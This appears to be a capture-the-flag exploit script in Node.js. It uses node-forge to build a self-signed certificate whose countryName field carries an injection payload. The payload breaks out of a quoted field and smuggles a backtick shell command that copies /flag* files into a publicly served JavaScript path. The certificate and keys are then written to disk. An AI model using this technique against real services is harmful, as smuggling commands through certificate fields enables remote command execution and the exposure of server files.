const forge = require("node-forge");
const fs = require("fs")

generateCert = (domain, org, locality, state, country) => {
    const subject = [{
        name: "countryName",
        value: country,
    }, {
        name: "stateOrProvinceName",
        value: state,
    }, {
        name: "localityName",
        value: locality,
    }, {
        name: "organizationName",
        value: org,
    }, {
        name: "commonName",
        value: domain,
    }];

    const keys = forge.pki.rsa.generateKeyPair(2048);
    const publicKey = forge.pki.publicKeyToPem(keys.publicKey);
    const privateKey = forge.pki.privateKeyToPem(keys.privateKey);
    const cert = forge.pki.createCertificate();
    
    cert.publicKey = keys.publicKey;
    cert.serialNumber = "01";
    cert.validity.notBefore = new Date();
    cert.validity.notAfter = new Date();
    cert.validity.notAfter.setFullYear(cert.validity.notBefore.getFullYear() + 1);
    cert.setSubject(subject);
    cert.setIssuer(subject);
    cert.sign(keys.privateKey);

    return {
        "privKey": privateKey,
        "pubKey": publicKey,
        "cert": forge.pki.certificateToPem(cert)
    };
}

parseCert = (certPem) => {
    try {
        const cert = forge.pki.certificateFromPem(certPem);

        const subject = cert.subject.attributes.reduce((acc, attr) => {
            acc[attr.name] = attr.value;
            return acc;
        }, {});

        const issuer = cert.issuer.attributes.reduce((acc, attr) => {
            acc[attr.name] = attr.value;
            return acc;
        }, {});
        
        const validFrom = cert.validity.notBefore;
        const validTo = cert.validity.notAfter;

        return {
            subject,
            issuer,
            validFrom,
            validTo,
        };
    } catch (error) {
        console.log(error)
        return false;
    }
}

country_name = `',file_name: '\`cat /flag* > /app/static/js/flag.js\`/hehe`
key_cert = generateCert("hehe", "hehe", "hehe", "hehe", `${country_name}`)
fs.writeFileSync("cert", key_cert["cert"])
fs.writeFileSync("privKey", key_cert["privKey"])
fs.writeFileSync("pubKey", key_cert["pubKey"])